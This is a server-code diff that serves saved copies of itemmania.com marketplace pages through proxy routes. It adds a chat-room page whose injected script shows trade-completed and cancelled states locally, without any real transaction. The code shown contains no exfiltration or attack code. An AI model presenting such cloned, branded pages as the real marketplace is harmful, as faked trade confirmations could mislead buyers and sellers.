@@ -91,6 +91,8 @@ const buyLineageClassicHtml   = loadSellHtml("buy-lineage-classic.html");
 const buyApplicationHtml      = loadSellHtml("buy-application-1.html");
 const chatHtml                = loadSellHtml("chat.html");
 const chatOrderedHtml         = loadSellHtml("chat-ordered.html");
+const chatNewHtml             = loadSellHtml("chat-new.html");
+const chatNewBuycheckHtml     = loadSellHtml("chat-new-buycheck.html");
 const sellApplicationHtml     = loadSellHtml("sell-application-1.html");
 const sellMaplestoryHtml      = loadSellHtml("sell-maplestory.html");
 const sellOdinHtml            = loadSellHtml("sell-odin.html");
@@ -721,6 +723,7 @@ const PROXY_URL_MAP: [string, string][] = [
   ['https://www.itemmania.com/buy/list.html',                 '/proxy/buy/list.html'],
   ['https://www.itemmania.com/buy/',                          '/proxy/buy/list.html'],
   ['https://www.itemmania.com/buy',                           '/proxy/buy/list.html'],
+  ['https://www.itemmania.com/myroom/chat/new_chat.html',     '/proxy/myroom/chat/new_chat.html'],
   ['https://www.itemmania.com/myroom/chat/list.html',         '/proxy/myroom/chat/list.html'],
   ['https://www.itemmania.com/myroom/chat/',                  '/proxy/myroom/chat/list.html'],
   ['https://www.itemmania.com/myroom/chat',                   '/proxy/myroom/chat/list.html'],
@@ -779,6 +782,7 @@ var ROUTE_MAP=[
   ['/buy/list.html','/proxy/buy/list.html'],
   ['/buy/','/proxy/buy/list.html'],
   ['/buy','/proxy/buy/list.html'],
+  ['/myroom/chat/new_chat.html','/proxy/myroom/chat/new_chat.html'],
   ['/myroom/chat/list.html','/proxy/myroom/chat/list.html'],
   ['/myroom/chat/','/proxy/myroom/chat/list.html'],
   ['/myroom/chat','/proxy/myroom/chat/list.html'],
@@ -967,6 +971,144 @@ function serveLineageClassic(html: string): string {
   return result + SELL_INTERCEPT_SCRIPT;
 }
 
+const CHAT_NEW_INTERCEPT_SCRIPT = `
+<script>
+(function() {
+  function api(method, path, body) {
+    return fetch('/api' + path, {
+      method: method, credentials: 'include',
+      headers: { 'Content-Type': 'application/json' },
+      body: body ? JSON.stringify(body) : undefined
+    }).then(function(r){ return r.json(); }).catch(function(){ return {}; });
+  }
+
+  function init() {
+    var params = new URLSearchParams(location.search);
+    var type = params.get('type') || 'sell'; // sell | buy
+
+    // ── 인수확인 버튼 텍스트 분기 ──────────────────────────────────
+    var tradeIngBtn = document.getElementById('trade_ing');
+    if (tradeIngBtn) {
+      tradeIngBtn.textContent = (type === 'buy') ? '인수확인' : '인수확인요청';
+    }
+
+    // ── 인수확인(요청) 클릭 → buy_check_layer 표시 ─────────────────
+    if (tradeIngBtn) {
+      tradeIngBtn.addEventListener('click', function(e) {
+        e.preventDefault(); e.stopImmediatePropagation();
+        var layer = document.getElementById('buy_check_layer');
+        if (layer) {
+          layer.style.display = 'block';
+          layer.classList.remove('sf-hidden');
+        }
+      }, true);
+    }
+
+    // ── buy_check_layer 버튼들 ──────────────────────────────────────
+    var cancelBtn = document.getElementById('cancel_btn');
+    if (cancelBtn) {
+      cancelBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        var layer = document.getElementById('buy_check_layer');
+        if (layer) layer.style.display = 'none';
+      });
+    }
+
+    var tradeEndBtn = document.getElementById('trade_end_btn');
+    if (tradeEndBtn) {
+      tradeEndBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        var layer = document.getElementById('buy_check_layer');
+        if (layer) layer.style.display = 'none';
+        var stateEl = document.getElementById('trade_state_text');
+        if (stateEl) stateEl.textContent = '거래완료';
+        var noticeEl = document.getElementById('chat_notice_txt');
+        if (noticeEl) { noticeEl.innerHTML = '<b>거래가 완료되었습니다.</b><br><span class=sub_txt>아이템매니아를 이용해 주셔서 감사합니다.</span>'; }
+        if (tradeIngBtn) { tradeIngBtn.disabled = true; tradeIngBtn.style.opacity = '0.4'; }
+      });
+    }
+
+    // ── 거래취소 ────────────────────────────────────────────────────
+    var cancelTrade = document.getElementById('trade_cancel');
+    if (cancelTrade) {
+      cancelTrade.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (confirm('거래를 취소하시겠습니까?')) {
+          var stateEl = document.getElementById('trade_state_text');
+          if (stateEl) stateEl.textContent = '거래취소';
+          if (tradeIngBtn) { tradeIngBtn.disabled = true; tradeIngBtn.style.opacity='0.4'; }
+          if (cancelTrade) { cancelTrade.disabled = true; cancelTrade.style.opacity='0.4'; }
+        }
+      });
+    }
+
+    // ── 채팅종료 ────────────────────────────────────────────────────
+    var exitBtn = document.getElementById('chat_exit');
+    if (exitBtn) {
+      exitBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (confirm('채팅을 종료하시겠습니까?')) { window.close(); }
+      });
+    }
+
+    // ── 채팅차단 / 신고하기 / 자주쓰는채팅 / 알림보내기 ───────────
+    ['chat_block','user_report','chat_template','chat_alarm','chat_print','send_file'].forEach(function(id) {
+      var el = document.getElementById(id);
+      if (el) el.addEventListener('click', function(e) {
+        e.preventDefault(); alert('해당 기능은 준비 중입니다.');
+      });
+    });
+
+    // ── 메시지 전송 ─────────────────────────────────────────────────
+    var sendBtn = document.getElementById('send_btn');
+    var textarea = document.getElementById('write_chat');
+    if (sendBtn && textarea) {
+      function sendMsg() {
+        var msg = textarea.value.trim();
+        if (!msg) return;
+        var list = document.getElementById('chat_content_list');
+        if (list) {
+          var now = new Date();
+          var hhmm = now.getHours().toString().padStart(2,'0') + ':' + now.getMinutes().toString().padStart(2,'0');
+          var div = document.createElement('div');
+          div.className = 'chat_item me';
+          div.innerHTML = '<div class=chat_msg><span>' + msg.replace(/</g,'&lt;') + '</span></div><div class=send_time>' + hhmm + '</div>';
+          list.appendChild(div);
+          list.scrollTop = list.scrollHeight;
+        }
+        textarea.value = '';
+      }
+      sendBtn.addEventListener('click', sendMsg);
+      textarea.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendMsg(); }
+      });
+    }
+
+    // ── 뒤로가기 링크 ───────────────────────────────────────────────
+    var backBtn = document.querySelector('a.back_btn');
+    if (backBtn) {
+      backBtn.href = '/proxy/myroom/chat/list.html';
+      backBtn.addEventListener('click', function(e) {
+        e.preventDefault(); location.href = '/proxy/myroom/chat/list.html';
+      });
+    }
+
+    // ── 로그인 상태 반영 ────────────────────────────────────────────
+    api('GET', '/auth/me').then(function(data) {
+      if (data && data.id) {
+        var uidEl = document.querySelector('.chat_user .uid');
+        // 내 채팅은 "me" 스타일 유지 — 별도 처리 없이 OK
+      }
+    });
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else { init(); }
+})();
+</script>
+`;
+
 const CHAT_INTERCEPT_SCRIPT = `
 <script>
 (function() {
@@ -1034,6 +1176,29 @@ const CHAT_INTERCEPT_SCRIPT = `
         }
       }
     });
+
+    // 채팅 목록 아이템 클릭 → 채팅방 오픈
+    document.body.addEventListener('click', function(e) {
+      // 버튼 클릭은 위의 �핸들러가 처리하므로 제외
+      if (e.target.closest('button')) return;
+      var li = e.target.closest && e.target.closest('li[data-expand], li[data-no]');
+      if (!li) return;
+      e.preventDefault(); e.stopPropagation();
+      var tid = li.getAttribute('data-expand') || li.getAttribute('data-no') || '';
+      var channel = li.getAttribute('data-channels') || '';
+      // 거래 타입 추론: .trade_type 클래스에서
+      var typeEl = li.querySelector('.trade_type');
+      var tradeType = 'sell';
+      if (typeEl) {
+        var cls = typeEl.className || '';
+        if (cls.includes('buy')) tradeType = 'buy';
+      }
+      if (tid) {
+        var url = '/proxy/myroom/chat/new_chat.html?tid=' + tid + '&type=' + tradeType;
+        if (channel) url += '&channel_no=' + channel;
+        window.open(url, '_chat_' + tid, 'width=900,height=700,resizable=yes,scrollbars=yes');
+      }
+    }, true);
   }
 
   if (document.readyState === 'loading') {
@@ -1418,6 +1583,43 @@ function serveChat(html: string): string {
   return result + CHAT_INTERCEPT_SCRIPT;
 }
 
+function extractBuyCheckLayer(src: string): string | null {
+  const start = src.indexOf('id=buy_check_layer');
+  if (start < 0) return null;
+  const divStart = src.lastIndexOf('<div', start);
+  if (divStart < 0) return null;
+  let depth = 0, i = divStart;
+  while (i < src.length) {
+    if (src.slice(i, i + 4) === '<div') depth++;
+    else if (src.slice(i, i + 6) === '</div>') { depth--; if (depth === 0) return src.slice(divStart, i + 6); }
+    i++;
+  }
+  return null;
+}
+
+function serveChatNew(html: string): string {
+  let result = prepare(html);
+
+  // buy_check_layer: 빈 레이어를 buycheck 파일의 전체 레이어로 교체
+  if (chatNewBuycheckHtml) {
+    const fullLayer = extractBuyCheckLayer(chatNewBuycheckHtml);
+    if (fullLayer) {
+      // hidden 스타일로 교체 (JS로 display:block 토글)
+      const hiddenLayer = fullLayer
+        .replace('style=display:block', 'style="display:none"')
+        .replace(/class="g_layer buy_check_layer"/, 'class="g_layer buy_check_layer" style="display:none"');
+      result = result.replace(
+        /<div[^>]+class="g_layer buy_check_layer[^"]*"[^>]*id=buy_check_layer[^>]*>[\s\S]*?<\/div>/,
+        hiddenLayer
+      );
+    }
+  }
+
+  return result.includes("</body>")
+    ? result.replace("</body>", CHAT_NEW_INTERCEPT_SCRIPT + "</body>")
+    : result + CHAT_NEW_INTERCEPT_SCRIPT;
+}
+
 // 원본 itemmania 경로로 JS가 상대경로 이동할 때 → 프록시 경로로 리다이렉트
 router.get(["/game_charge", "/game_charge/"], (_req, res): void => {
   res.redirect(302, "/proxy/game-charge");
@@ -1557,6 +1759,23 @@ router.get("/proxy/buy/list.html", (req, res): void => {
 router.get(["/buy/list.html", "/buy/"], (req, res): void => {
   const qs = req.url.includes("?") ? req.url.slice(req.url.indexOf("?")) : "";
   res.redirect(302, `/proxy/buy/list.html${qs}`);
+});
+
+// 개별 채팅방 페이지
+router.get("/proxy/myroom/chat/new_chat.html", (req, res): void => {
+  if (!chatNewHtml) {
+    res.status(503).send("<html><body><h2>페이지를 불러올 수 없습니다</h2></body></html>");
+    return;
+  }
+  res.set("Content-Type", "text/html; charset=utf-8");
+  res.set("Cache-Control", "no-cache");
+  res.send(serveChatNew(chatNewHtml));
+});
+
+// 채팅방 직접 접근 리다이렉트
+router.get("/myroom/chat/new_chat.html", (req, res): void => {
+  const qs = req.url.includes("?") ? req.url.slice(req.url.indexOf("?")) : "";
+  res.redirect(302, `/proxy/myroom/chat/new_chat.html${qs}`);
 });
 
 // 매니아 채팅 페이지
